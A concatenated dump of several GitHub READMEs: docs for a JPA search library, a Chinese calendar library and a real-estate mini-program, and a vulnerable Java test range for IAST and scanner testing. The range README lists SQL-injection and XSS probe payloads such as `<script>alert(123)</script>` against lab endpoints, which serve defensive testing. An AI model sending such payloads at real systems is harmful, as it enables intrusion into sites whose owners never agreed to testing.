| Ends With                 | endsWith    | sql_col LIKE '%val'                | 1,2 | yes            |
| Greater Than              | gt          | sql_col > val                      | 1,2 | yes            |
| Greater Than or Equal     | gte         | sql_col >= val                     | 1,2 | yes            |
| Less Than                 | lt          | sql_col < val                      | 1,2 | yes            |
| Less Than or Equal        | lte         | sql_col <= val                     | 1,2 | yes            |
| Between                   | between     | sql_col BETWEEN val1 AND val2      | 1,2 | yes            |
| Null                      | null        | sql_col IS NULL                    | 1,2 | no             |
| Empty                     | empty       | sql_collection_col IS NULL               | 1,2 | no             |

#### Options
**Mode 1**
| Option description | Library Key |
|--------------------|-------------|
| Ignore case        | #i          |
| Negation           | #n          |
| Trim               | #t          |

The option keys must be appended to the filter; e.g. _?firstName_eq#i=Biagio_ or _?firstName_eq#i#n=Biagio_

**Mode 2**
| Option description | Library Key (Java attributes) |
|------------------|-------------------------------|
| Ignore case      | ignoreCase                    |
| Negation      | negate                        |
| Trim | trim                          |

For each filter it is possible to define `options`
```json
{
  // ...
      {
         ""operator"": ""eq"",
         ""key"": ""firstName"",
         ""value"": ""Biagio"",
         ""options"": {
           ""ignoreCase"": true,
           ""trim"": false,
           ""negate"": true
         }
      }
  // ...
}
```
Java object:
```java  
@Data  
public static class JPASearchFilterOptions {  
 private boolean ignoreCase;  
 private boolean trim;  
 private boolean negate;  
}  
```

### Pagination

| Filter name | Key | Fixed values
|--|--|--|
| Limit (page size) | limit
| Offset (page number) | offset
| Sort | sort | ASC, DESC

**Mode 1**: e.g. *?firstName_sort=DESC&_limit=10&_offset=0*

**Mode 2**: value root `options`:
```json
{
  ""filter"" : {
    // ...
  },
  ""options"" : {
    ""sortKey"": ""firstName"",
    ""sortDesc"": true,
    ""pageSize"": 10,
    ""pageOffset"": 1
  }
}
```
Java object:
```java
@Data
public static class JPASearchOptions {
    private String sortKey;
    private Boolean sortDesc = false;
    private Integer pageSize;
    private Integer pageOffset;
    private List<String> selections;
}
```

### Other (only for Mode 1)
- Separator for array values: `,`: e.g. _?myField_in=test1,test2_ --> values to search for: [""**test1**"", ""**test2**""]
- To escape separator: `/,`: e.g. _?myField_in=test1,test2/,test3_ --> values to search for: [""**test1**"", ""**test2,test3**""]

## Projection - Usage

### 1. `@Projectable` annotation
Start by applying the `@Projectable` annotation to the fields in your Domain Model, or alternatively your JPA entity, **that you want to make available for selection**.
If you have fields that you want to make selectable within other objects then annotate these with `@NestedProjectable`.

```java
@Data
public class Person {

  @Searchable
  private String firstName;

  @Projectable
  @Searchable
  private String lastName;

  @Projectable(entityFieldKey = ""dateOfBirth"")
  @Searchable(entityFieldKey = ""dateOfBirth"")
  private Date birthDate;

  @Searchable
  private String country;
  
  @Searchable
  private String fillerOne;
  
  @Searchable
  private String fillerTwo;

  @NestedProjectable
  @NestedSearchable
  private Company company;

  @Data
  public static class Company {

    @Searchable(entityFieldKey= ""companyEntity.name"")
    private String name;
	
	@Projectable(entityFieldKey= ""companyEntity.employeesCount"")
    @Searchable(entityFieldKey= ""companyEntity.employeesCount"")
    private int employees;
  }
}
```
The annotation allows you to specify:

- Core properties:

  - `entityFieldKey`:
    the name of the field defined on the entity bean (not to be specified if using the annotation on the entity bean). If not specified the key will be the field name.

### 2. `JPASearchRepository` interface
Your Spring JPA repository must extend `JPAProjectionRepository<YourEntityClass>`.

```java  
@Repository  
public interface PersonRepository extends JpaRepository<PersonEntity, Long>, JPASearchRepository<PersonEntity>, JPAProjectionRepository<PersonEntity> {  
  
}  
```

### 3. Projection implementation
In your manager, or in your service, or wherever you want to use the repository:

**Mode 1**: define (or add to the map used for the Mode 1 search) a map:

- key: *selections*
- value: the only fields that you want to extract separated by commas `,`

```java
// ...

  @Autowired
  private PersonRepository personRepository;

  public List<Person> advancedSearch() {
  
    // Pure example, in real use case it is expected that these filters can be passed directly by the controller
    Map<String, String> filters = new HashMap<>();
    filters.put(""firstName_eq"", ""Biagio"");
    filters.put(""lastName_startsWith#i"", ""Toz""); // ignore case
    filters.put(""birthDate_gte"", ""19910101""); 
    filters.put(""country_in"", ""IT,FR,DE"");
    filters.put(""company.name_eq#n"", ""Bad Company""); // negation
    filters.put(""company.employees_between"", ""500,5000"");
    filters.put(""fillerOne_null#n"", ""true""); // not null
    filters.put(""fillerTwo_empty"", ""true""); // empty

    // Selections
    filters.put(""selections"", ""lastName,birthDate,company.employees"");
    
    // Without sorting
    List<Map<String, Object>> result = personRepository.projection(filters, Person.class, PersonEntity.class);
  
    filters.put(""birthDate_sort"" : ""ASC""); // sorting key and sorting order
    
    // With sorting
    List<Map<String, Object>> sortedAndPaginatedSearch = personRepository.projectionWithSorting(filters, Person.class, PersonEntity.class);
    
    // ... convert the list of maps into your model
  }

// ...
```

**Mode 2**: instead of a map, you will need to use [`JPASearchInput`](https://github.com/biagioT/jpa-search-helper/blob/main/src/main/java/app/tozzi/model/input/JPASearchInput.java), shown here, for simplicity, in JSON format.
```json
{
  ""filter"" : {
      ""operator"": ""and"", // the first filter must contain a root operator: AND, OR or NOT
      ""filters"" : [
        {
          ""operator"": ""eq"",
          ""key"": ""firstName"",
          ""value"": ""Biagio""
        },
        {
          ""operator"": ""or"",
          ""filters"": [
            {
              ""operator"": ""startsWith"",
              ""key"": ""lastName"",
              ""value"": ""Toz"",
              ""options"": {
                ""ignoreCase"": true
              }
            },
            {
              ""operator"": ""endsWith"",
              ""key"": ""lastName"",
              ""value"": ""ZZI"",
              ""options"": {
                ""ignoreCase"": true,
                ""trim"" : true
              }
            }
          ]
        },
        {
          ""operator"": ""in"",
          ""key"": ""company.name"",
          ""values"": [""Microsoft"", ""Apple"", ""Google""]
        },
        {
          ""operator"": ""or"",
          ""filters"": [
            {
              ""operator"": ""gte"",
              ""key"": ""birthDate"",
              ""value"": ""19910101""
            },
            {
              ""operator"": ""lte"",
              ""key"": ""birthDate"",
              ""value"": ""20010101""
            }
          ]
        },
        {
          ""operator"": ""empty"",
          ""key"": ""fillerOne"",
          ""options"": {
            ""negate"": true
          }
        },
        {
          ""operator"": ""between"",
          ""key"" : ""company.employees"",
          ""values"": [500, 5000],
          ""options"": {
            ""negate"": true
          }
        }
      ]
  },
  ""options"": {
    ""pageSize"": 10,
    ""pageOffset"": 0,
    ""sortKey"": ""birthDate"",
    ""sortDesc"": false,
    ""selections"" : [
		""lastName"",
		""birthDate"",
		""company.employees""
	]
  }
}
```

For both modes, the projection will return a List<Map<String, Object>> result where **the map structure and keys will reflect the entity structure** (to be clear *toJson(entityList) == toJson(mapList)*)

Note 1:
> Be careful: the default projection forces all Join relationships as LEFT JOIN. If you don't want this behavior, choose to use the repository methods (methods with 'Classic' suffix) that allow you to possibly modify only the relations you want to modify

Note 2:
> Projection, regardless of whether you want it or not, will always extract the fields that represent the primary keys of an entity (or related entities)

Note 3:

> Pagination is not supported

#### Exceptions:
- If a field does not exist, is not searchable, is not sortable or is not projectable, you will receive an `InvalidFieldException`.
- Other cases: `JPASearchException`

---

## Advanced Settings
### Join Fetch
It is possible to force joins with fetch to allow Hibernate (or your JPA framework) to execute a single query for the relationships defined on the entity. **This is only possible without pagination**:
```java
// ...

Map<String, JoinFetch> fetches = Map.of(""companyEntity"", JoinFetch.LEFT);
personRepository.findAll(filters, Person.class, fetches);

// ...
```

### Multiple entities for the same Domain Model
If you have a Domain Model that is the result of the conversion of multiple entities, it is possible to explicitly specify a map (string, string) whose key represents the name of the Domain Model field and the value is the name of the field of the entity to be searched for:
```java
// ...

Map<String, String> entityFieldMap = Map.of(""company"", ""companyEntity.name"");

// Without pagination
personRepository.findAll(filters, Person.class, fetches, entityFieldMap);

// With pagination
personRepository.findAllWithPaginationAndSorting(filters, Person.class, entityFieldMap);

// ...
```

### Multiple object for the same entity
Another special case could be where an object can be repeated within the Domain Model to represent multiple pieces of the entity. The solution for the search:
```java

@Entity
public class CoupleEntity {

  @Id
  private Long id;

  @Column(name = ""p1_fn"")
  private String p1FirstName;

  @Column(name = ""p1_ln"")
  private String p1LastName;

  @Column(name = ""p2_fn"")
  private String p2FirstName;

  @Column(name = ""p2_ln"")
  private String p2LastName;
}

@Data
public class Couple {

  @NestedSearchable
  private Person p1;

  @NestedSearchable
  private Person p2;

  @Data
  public static class Person {

    @Searchable(tags = {
            @Tag(fieldKey = ""p1.firstName"", entityFieldKey = ""p1FirstName""),
            @Tag(fieldKey = ""p2.firstName"", entityFieldKey = ""p2FirstName""),
    })
    private String firstName;

    @Searchable(tags = {
            @Tag(fieldKey = ""p1.lastName"", entityFieldKey = ""p1LastName""),
            @Tag(fieldKey = ""p2.lastName"", entityFieldKey = ""p2LastName""),
    })
    private String lastName;
  }
}
```

```bash
curl - request GET 
 - url 'https://www.myexampledomain.com/couples?
p1.firstName_iEq=Romeo
&p2.firstName_iEq=Giulietta'
```

---  
## Spring Boot Project example with HTTP Endpoint
Please note: this library does not expose any endpoints and therefore no controllers.
An example project, exhaustive and complete, is available  [here](https://github.com/biagioT/jpa-search-helper-demo).

#### Mode 1

Controller:
```java
@RestController
@RequestMapping(""/persons"")
public class PersonController {

  @Autowired
  private PersonManager personManager;

  @GetMapping(produces = MediaType.APPLICATION_JSON_VALUE)
  public List<Person> findPersons(@RequestParam Map<String, String> requestParams) {
    return personManager.find(requestParams);
  }
  
  @GetMapping(path=""/projection"", produces = MediaType.APPLICATION_JSON_VALUE)
  public List<Person> projection(@RequestParam Map<String, String> requestParams) {
    return personManager.projection(requestParams);
  }
}
```

Service/Manager bean:
```java
@Service
public class PersonManager {

  @Autowired
  private PersonRepository personRepository;

  public List<Person> find(Map<String, String> filters) {
    return personRepository.findAllWithPaginationAndSorting(filters, Person.class).stream().map(this::toModel).toList();
  }
  
  public List<Person> projection(Map<String, String> filters) {
    return personRepository.projection(filters, Person.class, PersonEntity.class).stream().map(this::toModel).toList();
  }

  private static Person toModel(PersonEntity personEntity) {
    // ...
  }
  
  private static Person toModel(Map<String, Object> entityMap) {
    // ...
  }

}
```
Curl:
```bash
curl - X GET 
'http://localhost:8080/persons?
firstName=Biagio
&lastName_startsWith=Toz
&birthDate_gte=19910101
&country_in=IT,FR,DE
&company.name_in=Microsoft,Apple
&company.employees_between=500,5000'
```

or

```bash
curl - X GET 
'http://localhost:8080/persons/projection?
firstName=Biagio
&lastName_startsWith=Toz
&birthDate_gte=19910101
&country_in=IT,FR,DE
&company.name_in=Microsoft,Apple
&company.employees_between=500,5000
&selections=firstName,birthDate'
```

#### Mode 2

Controller:
```java
@RestController
@RequestMapping(""/persons"")
@Validated
public class PersonController {

  @Autowired
  private PersonManager personManager;

  @PostMapping(produces = MediaType.APPLICATION_JSON_VALUE, consumes = MediaType.APPLICATION_JSON_VALUE)
  public List<Person> findPersons(@Valid @RequestBody JPASearchInput input) {
    return personManager.find(input);
  }
}

@PostMapping(path=""/projection"", produces = MediaType.APPLICATION_JSON_VALUE, consumes = MediaType.APPLICATION_JSON_VALUE)
  public List<Person> projection(@Valid @RequestBody JPASearchInput input) {
    return personManager.projection(input);
  }
}
```

Service/Manager bean:
```java
@Service
public class PersonManager {

  @Autowired
  private PersonRepository personRepository;

  public List<Person> find(JPASearchInput input) {
    return personRepository.findAllWithPaginationAndSorting(input, Person.class).stream().map(this::toModel).toList();
  }
  
  public List<Person> find(JPASearchInput input) {
    return personRepository.projection(input, Person.class, PersonEntity.class).stream().map(this::toModel).toList();
  }

  private static Person toModel(PersonEntity entity) {
    // ...
  }
  
  private static Person toModel(Map<String, Object> entityMap) {
    // ...
  }

}
```
Curl:
```bash
curl -X POST -H ""Content-type: application/json"" -d '{
  ""filter"" : {
      ""operator"": ""and"", // the first filter must contain a root operator: AND, OR or NOT
      ""filters"" : [
        {
          ""operator"": ""eq"",
          ""key"": ""firstName"",
          ""value"": ""Biagio""
        },
        {
          ""operator"": ""or"",
          ""filters"": [
            {
              ""operator"": ""startsWith"",
              ""key"": ""lastName"",
              ""value"": ""Toz"",
              ""options"": {
                ""ignoreCase"": true
              }
            },
            {
              ""operator"": ""endsWith"",
              ""key"": ""lastName"",
              ""value"": ""ZZI"",
              ""options"": {
                ""ignoreCase"": true,
                ""trim"" : true
              }
            }
          ]
        },
        {
          ""operator"": ""in"",
          ""key"": ""company.name"",
          ""values"": [""Microsoft"", ""Apple"", ""Google""]
        },
        {
          ""operator"": ""or"",
          ""filters"": [
            {
              ""operator"": ""gte"",
              ""key"": ""birthDate"",
              ""value"": ""19910101""
            },
            {
              ""operator"": ""lte"",
              ""key"": ""birthDate"",
              ""value"": ""20010101""
            }
          ]
        },
        {
          ""operator"": ""between"",
          ""key"" : ""company.employees"",
          ""values"": [500, 5000],
          ""options"": {
            ""negate"": true
          }
        }
      ]
  },
  ""options"": {
    ""pageSize"": 10,
    ""pageOffset"": 0,
    ""sortKey"": ""birthDate"",
    ""sortDesc"": false
  }
  
}' 'http://localhost:8080/persons'
```
or
```bash
curl -X POST -H ""Content-type: application/json"" -d '{
  ""filter"" : {
      ""operator"": ""and"", // the first filter must contain a root operator: AND, OR or NOT
      ""filters"" : [
        {
          ""operator"": ""eq"",
          ""key"": ""firstName"",
          ""value"": ""Biagio""
        },
        {
          ""operator"": ""or"",
          ""filters"": [
            {
              ""operator"": ""startsWith"",
              ""key"": ""lastName"",
              ""value"": ""Toz"",
              ""options"": {
                ""ignoreCase"": true
              }
            },
            {
              ""operator"": ""endsWith"",
              ""key"": ""lastName"",
              ""value"": ""ZZI"",
              ""options"": {
                ""ignoreCase"": true,
                ""trim"" : true
              }
            }
          ]
        },
        {
          ""operator"": ""in"",
          ""key"": ""company.name"",
          ""values"": [""Microsoft"", ""Apple"", ""Google""]
        },
        {
          ""operator"": ""or"",
          ""filters"": [
            {
              ""operator"": ""gte"",
              ""key"": ""birthDate"",
              ""value"": ""19910101""
            },
            {
              ""operator"": ""lte"",
              ""key"": ""birthDate"",
              ""value"": ""20010101""
            }
          ]
        },
        {
          ""operator"": ""between"",
          ""key"" : ""company.employees"",
          ""values"": [500, 5000],
          ""options"": {
            ""negate"": true
          }
        }
      ]
  },
  ""options"": {
    ""sortKey"": ""birthDate"",
    ""sortDesc"": false,
    ""selections"" : [
		""birthDate"",
		""firstName"",
		""lastName""
	]
  }
  
}' 'http://localhost:8080/persons/projection'
```
",30,1,1,MPL-2.0
6tail/tyme4j,master,"# Tyme [![License](https://img.shields.io/badge/license-MIT-4EB1BA.svg?style=flat-square)](https://github.com/6tail/tyme4j/blob/master/LICENSE)

Tyme是一个非常强大的日历工具库，可以看作 [Lunar](https://6tail.cn/calendar/api.html ""https://6tail.cn/calendar/api.html"") 的升级版，拥有更优的设计和扩展性，支持公历和农历、星座、干支、生肖、节气、法定假日等。

### Maven

```xml
<dependency>
  <groupId>cn.6tail</groupId>
  <artifactId>tyme4j</artifactId>
  <version>1.1.5</version>
</dependency>
```

## 示例

    import com.tyme.solar.SolarDay;
     
    public class Sample {
      public static void main(String[] args) {
        SolarDay solarDay = SolarDay.fromYmd(1986, 5, 29);
         
        // 1986年5月29日
        System.out.println(solarDay);
         
        // 农历丙寅年四月廿一
        System.out.println(solarDay.getLunarDay());
      }
    }

## 文档

请移步至 [https://6tail.cn/tyme.html](https://6tail.cn/tyme.html ""https://6tail.cn/tyme.html"")

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=6tail/tyme4j&type=Date)](https://star-history.com/#6tail/tyme4j&Date)
",15,2,1,MIT
youdeyunke/app,master,"![友得云客房产小程序-社区版](https://tcdn.udeve.net/fang2021/4bbe636b-e0e8-4580-8bb0-66bbf61f11bd.png)

<div align=""center"">

[产品官网](https://www.youdeyunke.com/?statId=6) | [帮助文档](https://youdeyunke.yuque.com/r/organizations/homepage) | [加入群聊](https://tcdn.udeve.net/udyk/66064f7e8ecade73b2385bb3.jpg)

</div>

# 友得云客房产小程序【社区版】<span>💯开源</span>


## 系统简介
友得云客房产小程序是一款专为房产行业打造的线上营销获客小程序系统，致力于帮助房产企业搭建私域流量平台，以数字化精准营销提升销售效果，驱动业绩增长。作为行业先行者，我们深谙互联网线上营销的要义，将多年的经验与技术融汇于一身，为您提供完善的、已成型的房产小程序系统。基于此【社区版】您无需授权即可获取全部源代码，并进行二次开发，允许用于商业用途，但需要保留版权信息。


## 安装教程

*   [从宝塔面板docker应用商店一键安装服务端教程](https://youdeyunke.yuque.com/fbxh1v/install/bt)
*  [小程序端搭建教程](https://youdeyunke.yuque.com/fbxh1v/install/dt57os0gz4dk8h5b)


## 在线演示

| 内容 | 社区版|  专业版   |
| --- | --- | --- |
| 管理端演示地址 | https://demo2.youdeyunke.com/ | https://demo.youdeyunke.com/admin/index.html |
| 管理端演示用户名 | 	`gitee@youdeyunke.com` | `gitee@youdeyunke.com` |
| 管理端演示用户密码 | `88888888` | [咨询客服获取密码](https://work.weixin.qq.com/kfid/kfc8a0f8817daf2ec01) |
| 网站端演示地址 | `不支持` | https://demo.youdeyunke.com |
| 小程序演示 | ![](https://tcdn.udeve.net/udyk/672eec7ae4b07694cf4cb409.png) |  ![](https://tcdn.udeve.net/udyk/65a0d469b33aac0d968a3529.jpg) |


## 商用须知

社区版允许用于商业用途，而无需取得授权。但需要在小程序首页底部保留“友得云客”品牌露出，未经允许不可移除此标志，否则将构成侵权，我公司将委托律师事务所进行维权。

* 示例：
![](https://tcdn.udeve.net/udyk/672eebbfe4b07694cf4cb408.png)

* 素材图片:https://tcdn.udeve.net/udyk/65ae2b4db33ac5e0e29f7ccf.png
* 尺寸规范：宽度不少于120rpx，高度不少于60rpx
* 显示位置：小程序首页底部居中显示



## 界面截图
![友得云客房产小程序界面截图](https://demo-1255998955.cos.ap-shanghai.myqcloud.com/udyk/screens.png)


## 成功案例

以下成功案例均基于【友得云客】进行构建，案例中的业务类型包括：线上售楼部、海外房产、房产自媒体、房产分销等多种不同业务类型

| ![](https://tcdn.udeve.net/fang2021/2fb1dc49-a444-4d66-8de2-7dac4221f166.jpg?imageView2/2/w/400) | ![](https://tcdn.udeve.net/fang2021/2a013aa5-466e-436a-85fc-aa1c8f62e6d9.jpg?imageView2/2/w/400) | ![](https://tcdn.udeve.net/fang2021/783455da-f320-4ade-bf8a-bc8fbb265236.jpg?imageView2/2/w/400) |
| :----------------------------------------------------------: | :----------------------------------------------------------: | :----------------------------------------------------------: |
|                            汉普顿                            |                          青特云置业                          |                            巧房子                            |
| ![](https://tcdn.udeve.net/fang2021/0fada889-b400-4b29-bc14-bf2e2202490d.jpg?imageView2/2/w/400) | ![](https://tcdn.udeve.net/fang2021/25eee934-77d9-4492-900f-c2d4259226d7.jpg?imageView2/2/w/400) | ![](https://tcdn.udeve.net/fang2021/58e662ca-e7af-4e57-bed3-d2280831127f.jpg?imageView5/2/w/400) |
|                           宁波甬房                           |                          特变e享家                           |                         学长看房笔记                         |



## 参与贡献

1. Fork 本仓库
2. 新建 feature-xxx 分支
3. 提交代码
4. 新建 Merge Request


## 特别鸣谢
特别感谢以下开源项目

 * vant-ui
 * ElementUI
 * mysql
 * docker
 * 宝塔面板
 

## 版权须知

Apache License 2.0 许可的主要内容包括：

授权：允许任何人以任何目的使用、复制、修改和分发该软件。

版权声明：要求在软件和相关文档中包含原始版权声明和许可证声明。

保证免责：表明该软件是按现状提供的，没有任何明示或暗示的担保或保证。作者不承担任何赔偿责任。

贡献者授权：要求所有贡献者授予 Apache 软件基金会永久性的、免费的、不可撤销的许可，以使用、复制、修改和分发其贡献。

专利许可：为了保护使用该软件的用户，该许可要求贡献者授权任何必要的专利许可，以便将其用于 Apache 软件基金会的项目。

Apache License 2.0 是一种宽松的开源许可，允许人们自由使用、修改和分发软件。

本项目包含的第三方源码和二进制文件之版权信息另行标注。

*友得云客®* 商标和著作权所有者为优得（西安）信息科技有限公司。侵权必究

**本软件已登记软著，必须保留原始版权文字信息，违者将依法追究法律责任。**


![](https://tcdn.udeve.net/udyk/672eef97e4b07694cf4cb40a.png)
",1,0,1,Apache-2.0
lokerxx/JavaVul,master,"# JavaVul

![](https://socialify.git.ci/lokerxx/JavaVul/image?description=1&font=Inter&forks=1&name=1&owner=1&pattern=Circuit%20Board&stargazers=1&theme=Light)

## 介绍

Java 安全漏洞靶场，用于测试IAST和扫描器的被动扫描功能，集合了多个安全漏洞，利用docker镜像为每个靶场独立环境运行。

文章：[IAST实践总结](https://mp.weixin.qq.com/s/ahxKXv5eKcULVF_VqAjbyg)

## 部署

mvn版本

```sh
# mvn --version
Apache Maven 3.0.5 (Red Hat 3.0.5-17)
Maven home: /usr/share/maven
Java version: 1.8.0_192, vendor: Oracle Corporation
Java home: /usr/java/jdk1.8.0_192/jre
Default locale: en_US, platform encoding: UTF-8
OS name: ""linux"", version: ""3.10.0-1160.el7.x86_64"", arch: ""amd64"", family: ""unix""
```

docker和docker-compose版本

```sh
# docker version
Client:
 Version:         1.13.1
 API version:     1.26
 Package version: docker-1.13.1-209.git7d71120.el7.centos.x86_64
 Go version:      go1.10.3
 Git commit:      7d71120/1.13.1
 Built:           Wed Mar  2 15:25:43 2022
 OS/Arch:         linux/amd64

Server:
 Version:         1.13.1
 API version:     1.26 (minimum version 1.12)
 Package version: docker-1.13.1-209.git7d71120.el7.centos.x86_64
 Go version:      go1.10.3
 Git commit:      7d71120/1.13.1
 Built:           Wed Mar  2 15:25:43 2022
 OS/Arch:         linux/amd64
 Experimental:    false

# docker-compose version
docker-compose version 1.18.0, build 8dd22a9
docker-py version: 2.6.1
CPython version: 3.6.8
OpenSSL version: OpenSSL 1.0.2k-fips  26 Jan 2017
```

> 默认docker和docker-compose太低，需要安装比较新的
>
> ```
>  yum remove docker \
>               docker-client \
>               docker-client-latest \
>               docker-common \
>               docker-latest \
>               docker-latest-logrotate \
>               docker-logrotate \
>               docker-engine
> 
> sudo yum install -y yum-utils
> sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
> 
> sudo yum install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin docker-compose
> ```

下载项目

```sh
git clone https://github.com/lokerxx/JavaVul
```

以下是运行脚本：

|            文件            |                             作用                             |            运行            |
| :------------------------: | :----------------------------------------------------------: | :------------------------: |
| docker-compose-build.yaml  | 在容器里面构建jar包，每个靶场构建会重复构建（**构建速度会很慢，不建议**） | `bash run-build_images.sh` |
| docker-compose-local.yaml  | 宿主机maven构建各个靶场的jar包，多个靶场可以基于maven缓存快速构建（**推荐**） | `bash run-local-build.sh`  |
| docker-compose-remote.yaml | 直接去dockerhub下载我构建上传成功的镜像（**镜像更新不及时**） |    `bash run-remote.sh`    |

> 此外，需修改yaml文件里面`flask.environment.HOST`为宿主机的IP，用于跑测试用例。**然后我在yaml文件已经默认挂载agent.jar**，如果你们要测试IAST agent功能，直接替换到`agent/agent.jar`即可。我这边自己写了一个简单的java agent，参考下面[SimpleAgent]()

> 如果要测试被动代理扫描，需要修改`index/app.py`里面`proxy_mode`为`True`，修改自己的代理地址：`proxies`

> **修改完成之后，根据自己的需求，运行上面表格的sh脚本部署运行即可**。

> 因为漏洞应用比较多**但是接口比较少**，我给每个应用配置512-1024M内存（测试运行要16G内存）。如果要配置大一点测试 IAST AGENT，则可以批量修改`docker-compose.yaml`的`-Xms512m -Xmx1024m`的环境变量

> 基本web漏洞的代码审计的细节，参考这里：https://github.com/lokerxx/CybersecurityNote/tree/master/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA%E6%BC%8F%E6%B4%9E



### 压力测试

部署运行

|              文件               |                         作用                         |          运行          |
| :-----------------------------: | :--------------------------------------------------: | :--------------------: |
| docker-compose-microservice.yml | 运行多个springcloud微服务，用于测试多链路 IAST agent | `run-local-service.sh` |

测试用例

| 接口                                            | 压测命令                                                     |
| ----------------------------------------------- | ------------------------------------------------------------ |
| http://ip:29998/process-user-data?userData=test | ` ab -n 1000 -c 20 ""http://IP:29998/process-user-data?userData=test""` |



## 支持靶场

|          文件夹           |                           安全漏洞                           |  测试用途  |                       备注                        |
| :-----------------------: | :----------------------------------------------------------: | :--------: | :-----------------------------------------------: |
|  actuator_authorized_1.X  |                   actuator 未授权访问 1.X                    |    修复    |                                                   |
|  actuator_authorized_2.X  |                   actuator 未授权访问 2.X                    |    修复    |                                                   |
| actuator_unauthorized_1.X |                   actuator 未授权访问 1.X                    |    漏洞    |                                                   |
| actuator_unauthorized_2.X |                   actuator 未授权访问 2.X                    |    漏洞    |                                                   |
|         base_vul          | SQL注入、XSS、不安全文件操作、重定向漏洞、正则DOS漏洞、Crlf注入漏洞、命令注入漏洞、SPEL漏洞、SSRF漏洞、SSTI漏洞、不安全反射漏洞、XXE漏洞 |    漏洞    |                                                   |
|      base_vul_repair      | SQL注入、XSS、不安全文件操作、重定向漏洞、正则DOS漏洞、Crlf注入漏洞、命令注入漏洞、SPEL漏洞、SSRF漏洞、SSTI漏洞、不安全反射漏洞、XXE漏洞 |    修复    |                                                   |
|          cas_xxe          |                           XXE漏洞                            |    漏洞    | cas在3.1.1-3.5.1存在XXE漏洞<br />修复版本为3.6.0- |
|        collections        |                     collections 反序列化                     | **未完成** |                                                   |
|      CVE-2019-10173       |                     XStream反序列化漏洞                      |    漏洞    |                                                   |
|      CVE-2019-12384       |                jackson-databind 反序列化漏洞                 |    漏洞    |                                                   |
|     druid_authorized      |                       druid未授权漏洞                        |    修复    |                                                   |
|    druid_unauthorized     |                       druid未授权漏洞                        |    漏洞    |                                                   |
|        fastjson-*         |                 各个版本fastjson反序列化漏洞                 |    漏洞    |                                                   |
|         Hibernate         |                      Hibernate 注入漏洞                      | 修复、漏洞 |                                                   |
|          HSQLDB           |                       HSQLDB 注入漏洞                        | 修复、漏洞 |                                                   |
|            jsp            |                                                              | **未完成** |                  jsp版的base_vul                  |
|         log4jvul          |                         log4j2 漏洞                          |    漏洞    |                                                   |
|  microservice-*-service   |                          分布式服务                          |  性能测试  |            用于验证分布式微服务的性能             |
|         wxpay-xxe         |                       微信支付XXE漏洞                        |    漏洞    |                                                   |
|         logic_vul         |                        业务逻辑漏洞：                        |            |                                                   |
|                           |                                                              |            |                                                   |
|                           |                                                              |            |                                                   |
|                           |                                                              |            |                                                   |





## 运行

访问：`http://宿主机IP:5000/`

我配置了三种模式：

- 攻击：发送一些payload，触发漏洞
- 正常：有可能是漏洞，但是发送是正常的数据
- 修复：漏洞已经修复，但是payload不生效（过滤或者报错）
- 误报：IAST或SAST误报检测的安全漏洞

其中右边测试按钮，可以对这个接口进行用例测试。

![image-20240306164920221](.gitbook/assets/image-20240306164920221.png)

也可以自定义发送payload，进行调试

![image-20240306165001240](.gitbook/assets/image-20240306165001240.png)

也可以批量发送请求，各个漏洞的回显，会在下面显示。

![image-20240127215349622](.gitbook/assets/image-20240127215349622.png)



## SimpleAgent

Java Agent 是一种工具，它可以使用 Java Instrumentation API 在运行时修改字节码。一个非常简单的 Java Agent 可以仅仅记录一个消息，以表明它已被加载。

首先，创建 Agent 类 `SimpleAgent.java`：

```java
package my.agent;

import java.lang.instrument.Instrumentation;

public class SimpleAgent {
    public static void premain(String agentArgs, Instrumentation inst) {
        System.out.println(""SimpleAgent 已加载"");
    }
}
```

在这段代码中，`premain` 方法是 Java Agent 的入口点。它在应用程序的 `main` 方法之前被调用。

接下来，你需要一个 manifest 文件来指定 Agent-Class。创建一个名为 `MANIFEST.MF` 的文件，内容如下：

```
Manifest-Version: 1.0
Premain-Class: my.agent.SimpleAgent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

这个 manifest 文件指定了 agent 类并启用了一些功能，如类的重定义和重转换。

现在，将 Java Agent 编译并打包成 JAR 文件。假设你的 Java 文件在 `src` 目录中，使用 `javac` 和 `jar` 命令，你可以这样做：

1. 编译 agent 类：

```sh
# javac -source 1.8 -target 1.8 -d . src/main/java/my/agent/SimpleAgent.java
```

2. 将编译后的类打包成带有 manifest 的 JAR 文件：

```sh
# jar cvfm SimpleAgent.jar MANIFEST.MF my/agent/SimpleAgent.class
added manifest
adding: my/agent/SimpleAgent.class(in = 492) (out= 320)(deflated 34%)
```

现在你有了一个可以作为 Java Agent 使用的 `SimpleAgent.jar`。要将这个 agent 附加到你的应用程序上，启动 Java 应用程序时使用 `-javaagent` 选项，将`SimpleAgent.jar`重命名到`./agent/agent.jar`

```sh
# mv SimpleAgent.jar ../agent/agent.jar
```



## 支持测试的漏洞

| 接口 | 漏洞名字 | 请求方法 | url | 接口类型 |
| :----------------------------------------: | :---------------------------------------------------------: | -------- | :----------------------------------------------------------: | :------: |
| druid_authorized | druid未授权漏洞 | GET | http://192.168.0.9:9996/druid | 修复 |
| actuator2_authorized | SpringBoot Actuator未授权访问漏洞2.X | GET | http://192.168.0.9:9994/actuator | 修复 |
| actuator1_authorized | SpringBoot Actuator未授权访问漏洞1.X | GET | http://192.168.0.9:9992/trace | 修复 |
| sql_injection_id_repair | SQL注入-mybatics-数字 | GET | http://192.168.0.9:9990/users/1'/ | 修复 |
| sql_injection_ids_repair | SQL注入-mybatics-数组 | GET | http://192.168.0.9:9990/users/ids/?ids=1,2,3' | 修复 |
| sql_injection_like_repair | SQL注入-mybatics-like模糊匹配 | GET | http://192.168.0.9:9990/users/name?name=A' | 修复 |
| sql_injection_strs_repair | SQL注入-mybatics-字符串数组 | GET | http://192.168.0.9:9990/users/names?names=Alice&names=Bob' | 修复 |
| sql_injection_orderby_repair | SQL注入-mybatics-排序 | GET | http://192.168.0.9:9990/users/sort?orderByColumn=name&orderByDirection=asc' | 修复 |
| xss_reflect_htmlEscape_repair | 反射型XSS漏洞-htmlEscape类 | GET | http://192.168.0.9:9990/xss_reflect_htmlEscape?name=<script>alert(123)</script> | 修复 |
| xss_reflect_escapeHtml4_repair | 反射型XSS漏洞-escapeHtml4类 | GET | http://192.168.0.9:9990/xss_reflect_escapeHtml4?name=<script>alert(123)</script> | 修复 |
